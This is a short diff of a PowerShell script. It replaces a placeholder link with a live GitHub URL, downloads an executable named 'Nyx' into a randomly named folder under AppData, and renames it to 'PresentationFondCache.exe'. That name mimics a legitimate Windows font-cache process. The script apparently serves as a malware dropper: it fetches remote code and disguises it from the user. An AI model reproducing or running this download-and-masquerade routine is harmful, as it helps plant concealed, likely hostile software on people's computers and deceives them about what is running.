@@ -4,7 +4,7 @@
 New-Item -Path "$env:APPDATA" -Name "R5ZXPKL8" -ItemType Directory
 
 # Download Nyx
-Invoke-WebRequest rawexefilelink -OutFile "$env:APPDATA\R5ZXPKL8\R5ZXPKL8.exe"
+Invoke-WebRequest https://raw.githubusercontent.com/n3exsus/Nyx/main/R5ZXPKL8/R5ZXPKL8.exe -OutFile "$env:APPDATA\R5ZXPKL8\R5ZXPKL8.exe"
 
 # Change Nyx name
 Rename-Item -Path "$env:APPDATA\R5ZXPKL8\R5ZXPKL8.exe" -NewName "PresentationFondCache.exe"
